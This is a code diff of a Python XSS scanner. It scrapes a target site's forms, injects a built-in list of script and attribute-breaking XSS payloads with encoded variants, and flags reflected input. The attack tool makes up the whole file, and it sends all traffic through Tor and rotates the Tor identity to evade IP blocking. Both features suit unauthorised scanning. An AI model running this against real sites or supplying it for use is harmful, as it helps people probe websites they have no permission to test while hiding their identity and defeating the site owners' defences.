@@ -1,71 +1,91 @@
 import requests
-import urllib.parse
-import base64
+import re
 import threading
-import argparse
+import random
+import json
 import time
-from html import escape
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+from stem.control import Controller
+from stem import Signal
 
-# Configure Tor proxy
-PROXIES = {
+# Tor Proxy Setup
+TOR_PROXY = {
     "http": "socks5h://127.0.0.1:9050",
     "https": "socks5h://127.0.0.1:9050"
 }
 
-# Encode the payloads in different formats
-def encode_payloads(payload):
-    return {
-        "original": payload,
-        "url_encoded": urllib.parse.quote(payload),
-        "base64": base64.b64encode(payload.encode()).decode(),
-        "html_encoded": escape(payload)
-    }
+def change_tor_ip():
+    """Changes the Tor identity to prevent IP blocking."""
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate(password="your_password")
+        controller.signal(Signal.NEWNYM)
+        time.sleep(3)
 
-# Perform the XSS test request
-def test_xss(url, payload):
-    encoded_variants = encode_payloads(payload)
+def get_forms(url, session):
+    """Extracts all forms from a given URL."""
+    response = session.get(url, proxies=TOR_PROXY)
+    soup = BeautifulSoup(response.text, "html.parser")
+    return soup.find_all("form")
+
+def generate_payloads():
+    """Generates a list of XSS payloads with different encoding techniques."""
+    base_payloads = [
+        "<script>alert('XSS')</script>",
+        "\"><script>alert('XSS')</script>",
+        "'><script>alert('XSS')</script>",
+        "\" onmouseover=alert('XSS') "
+    ]
+    mutations = [lambda p: p.replace("<", "%3C").replace(">", "%3E"),
+                 lambda p: p.replace("'", "&#39;"),
+                 lambda p: p.replace("\"", "&quot;")]
     
-    for encoding, encoded_payload in encoded_variants.items():
-        try:
-            target_url = url.replace("XSS_PAYLOAD", encoded_payload)
-            response = requests.get(target_url, proxies=PROXIES, timeout=5)
+    return base_payloads + [mutate(p) for p in base_payloads for mutate in mutations]
 
-            if payload in response.text:
-                print(f"[✅] XSS Vulnerability Detected! ({encoding}) ➜ {target_url}")
-                with open("xss_results.log", "a") as log:
-                    log.write(f"[✅] {target_url}\n")
-            else:
-                print(f"[❌] Not Vulnerable: {target_url}")
+def test_xss(url, form, session, payloads):
+    """Tests XSS by injecting payloads into form fields."""
+    action = form.get("action")
+    method = form.get("method", "get").lower()
+    inputs = form.find_all("input")
+    
+    target_url = urljoin(url, action)
+    for payload in payloads:
+        data = {i.get("name", "test"): payload for i in inputs}
+        
+        if method == "post":
+            response = session.post(target_url, data=data, proxies=TOR_PROXY)
+        else:
+            response = session.get(target_url, params=data, proxies=TOR_PROXY)
+        
+        if payload in response.text:
+            print(f"[🔥] XSS Found! {target_url} with payload: {payload}")
+            return True
+    return False
 
-        except requests.RequestException as e:
-            print(f"[⚠️] Request Failed: {e}")
+def scan_website(url):
+    """Main function to scan a website for XSS vulnerabilities."""
+    session = requests.Session()
+    forms = get_forms(url, session)
+    payloads = generate_payloads()
+    
+    print(f"[🚀] Found {len(forms)} form(s) on {url}")
+    for form in forms:
+        if test_xss(url, form, session, payloads):
+            print("[✅] Site is vulnerable!")
+            return
+    print("[❌] No XSS found.")
 
-# Multi-threaded scanning
-def start_scan(url, payloads, threads):
-    def worker(payload):
-        test_xss(url, payload)
-
-    with threading.Semaphore(threads):
-        for payload in payloads:
-            threading.Thread(target=worker, args=(payload,)).start()
-
-# CLI Argument Parsing
 def main():
-    parser = argparse.ArgumentParser(description="Automated XSS Scanner with IP Rotation")
-    parser.add_argument("url", help="Target URL (Use 'XSS_PAYLOAD' as the injection point)")
-    parser.add_argument("-p", "--payloads", help="Custom payload file", default="payloads.txt")
-    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
-
-    args = parser.parse_args()
-
-    # Load payloads
-    with open(args.payloads, "r") as f:
-        payloads = [line.strip() for line in f.readlines() if line.strip()]
-
-    print(f"[🚀] Scanning {args.url} with {args.threads} threads using {len(payloads)} payloads...")
+    url = input("Enter target URL: ")
+    threads = []
+    for _ in range(3):
+        t = threading.Thread(target=scan_website, args=(url,))
+        threads.append(t)
+        t.start()
+        change_tor_ip()
     
-    # Start scanning
-    start_scan(args.url, payloads, args.threads)
+    for t in threads:
+        t.join()
 
 if __name__ == "__main__":
     main()
